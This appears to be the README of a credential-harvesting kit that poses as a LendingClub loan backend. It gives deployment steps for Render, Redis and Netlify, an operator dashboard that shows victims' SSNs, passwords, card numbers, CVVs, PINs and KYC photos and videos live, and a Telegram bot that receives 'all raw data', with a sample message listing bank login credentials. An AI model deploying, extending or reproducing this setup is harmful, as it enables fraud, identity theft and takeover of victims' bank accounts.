# LendingClub Backend — Render + Redis + Telegram

## Files in This Repo

```
backend/
├── server.js        ← Express + WebSocket + Redis + Supabase + Telegram
├── admin.html       ← Live Admin Dashboard (deploy to Netlify alongside frontend)
├── package.json     ← Dependencies
├── render.yaml      ← One-click Render deploy config
├── .env.example     ← Copy → .env, fill in values
└── README.md        ← This file
```

---

## Step 1 — Get Redis (Free, 2 minutes)

1. Go to **[upstash.com](https://upstash.com)** → Sign up free
2. Click **Create Database** → Name it `lendingclub` → Select region closest to you → Create
3. On the database page, scroll to **REST API** section
4. Copy the **REDIS_URL** (format: `rediss://default:PASSWORD@HOST.upstash.io:6379`)

---

## Step 2 — Get Telegram Bot

1. Open Telegram → search for **@BotFather** → `/newbot`
2. Follow prompts → copy the **bot token** (format: `1234567890:AABBCCDDeeff...`)
3. Send any message to your new bot
4. Visit: `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`
5. Look for `"chat":{"id": -100XXXXXXXXXX}` — that's your **Chat ID**
   - For a group/channel chat ID, it starts with `-100`
   - For personal chat, it's a positive number

---

## Step 3 — Get Supabase Service Role Key

1. Go to your Supabase project → **Settings → API**
2. Under **Project API Keys**, copy the **service_role** key (starts with `eyJ...`)
3. ⚠️ **Never put this in config.js or any frontend file**

---

## Step 4 — Deploy to Render

### Option A: One-click via render.yaml
1. Push this folder to a GitHub repo
2. Go to **[render.com](https://render.com)** → New → Blueprint
3. Connect your repo → Render detects `render.yaml` automatically
4. Fill in all environment variables when prompted
5. Deploy

### Option B: Manual
1. Go to **render.com** → New → Web Service
2. Connect your GitHub repo
3. Settings:
   - **Build Command:** `npm install`
   - **Start Command:** `node server.js`
   - **Environment:** Node
   - **Plan:** Free
4. Add these Environment Variables:

| Key | Value |
|-----|-------|
| `SUPABASE_URL` | `https://drjddwwllaxwuwfqpujg.supabase.co` |
| `SUPABASE_SERVICE_ROLE_KEY` | Your service role key |
| `REDIS_URL` | Your Upstash Redis URL |
| `TELEGRAM_BOT_TOKEN` | Your bot token |
| `TELEGRAM_CHAT_ID` | Your chat/group ID |
| `ADMIN_SECRET_KEY` | Strong random string (min 20 chars) |
| `ALLOWED_ORIGINS` | Your Netlify URL (e.g. `https://your-site.netlify.app`) |
| `NODE_ENV` | `production` |
| `PORT` | `3000` |

5. Click **Create Web Service** → Wait ~2 minutes for deploy

---

## Step 5 — Update config.js on Netlify

After your Render URL is live (e.g. `https://lendingclub-backend.onrender.com`):

```js
// In config.js — update these two lines:
BACKEND_URL:    'https://lendingclub-backend.onrender.com',
BACKEND_WS_URL: 'wss://lendingclub-backend.onrender.com',
```

Redeploy the Netlify site (just drag the folder again or trigger a redeploy).

---

## Step 6 — Deploy admin.html to Netlify

Add `admin.html` to the **same folder** as your other frontend files:
```
📁 netlify-folder/
├── 4contract.html
├── index_gem2.html
├── admin.html       ← Add this
├── config.js
└── session_handler.js
```
Redeploy to Netlify. Access your admin panel at:
`https://your-site.netlify.app/admin.html`

---

## Step 7 — Using the Admin Dashboard

1. Open `admin.html` in browser
2. Enter your **Render backend URL** and **Admin Secret Key**
3. Click **Access Panel**

### When a client submits a step:
- A submission card appears in real-time in the center panel
- Sensitive data (SSN, password, card, CVV, PIN) is **blurred by default**
- Click the 👁 eye icon to reveal any field
- KYC photos load inline; liveness videos are playable inline

### Approve:
- Click **✓ Approve** on the card
- Client's screen automatically advances to next step
- All raw data is sent to your Telegram bot immediately

### Reject:
- Click **✗ Reject** on the card
- Choose a preset reason or type custom
- Client sees the rejection message with option to retry

---

## API Reference

All admin routes require: `Authorization: Bearer YOUR_ADMIN_SECRET_KEY`

| Method | Route | Description |
|--------|-------|-------------|
| `GET`  | `/health` | Server health check |
| `GET`  | `/admin/sessions` | All sessions with live status |
| `GET`  | `/admin/session/:id` | Full detail for one session |
| `GET`  | `/admin/submissions?status=pending_review` | Submission queue |
| `POST` | `/admin/approve/:submissionId` | Approve a step → Telegram |
| `POST` | `/admin/reject/:submissionId` | Reject with reason |
| `POST` | `/admin/command` | Send any command to a session |
| `GET`  | `/admin/stream` | Admin SSE real-time feed |
| `GET`  | `/admin/media-url?path=...` | Fresh signed URL for media |
| `POST` | `/upload/media` | KYC file upload (from client) |
| `POST` | `/event` | Step tracking (from client) |
| `GET`  | `/events/:sessionId` | SSE for client (fallback) |

---

## Redis Key Structure

| Key Pattern | Type | Contents |
|-------------|------|----------|
| `session:{sessionId}` | Hash | `session_id, application_id, current_page, current_step` |
| `app:{appId}:sessions` | Set | All sessionIds for an applicationId |
| `app:{appId}:submissions` | List | All submissionIds for an applicationId |
| `heartbeat:{sessionId}` | String | TTL=35s — expires if client stops pinging |
| `ws:sessions` | Hash | sessionId → `1` if WS connection is alive |

---

## Telegram Message Format (on Approve)

```
✅ APPROVED — Bank Login Credentials

👤 Client: John Smith
🆔 App ID: AB3F9X2025
💰 Loan: $15,000
📅 Approved At: 1/15/2025, 2:34:12 PM ET

━━━━━━━━━━━━━━━━━━━━
📋 SUBMITTED DATA:
🏦 Bank:      Chase
👤 Username:  john.smith@email.com
🔑 Password:  MyP@ssw0rd123
━━━━━━━━━━━━━━━━━━━━
🗃 Session: a1b2c3d4...
```

---

## Troubleshooting

**"Disconnected" in admin panel:**
- Check Render logs for errors
- Verify `ADMIN_SECRET_KEY` matches what you entered
- Check `ALLOWED_ORIGINS` includes your Netlify URL

**Telegram not sending:**
- Verify bot token is correct
- Make sure you messaged the bot first (it can't initiate)
- For groups: add the bot to the group and use group's chat ID

**Redis connection errors:**
- Upstash free tier uses TLS — URL must start with `rediss://` (double s)
- Check the URL was copied correctly from Upstash dashboard

**Client shows "Disconnected" status bar:**
- `config.js` `BACKEND_URL` and `BACKEND_WS_URL` must be set and redeployed
- Check Render service is not sleeping (free tier sleeps after 15min inactivity)
- Render free tier: first request after sleep takes ~30s — normal behavior
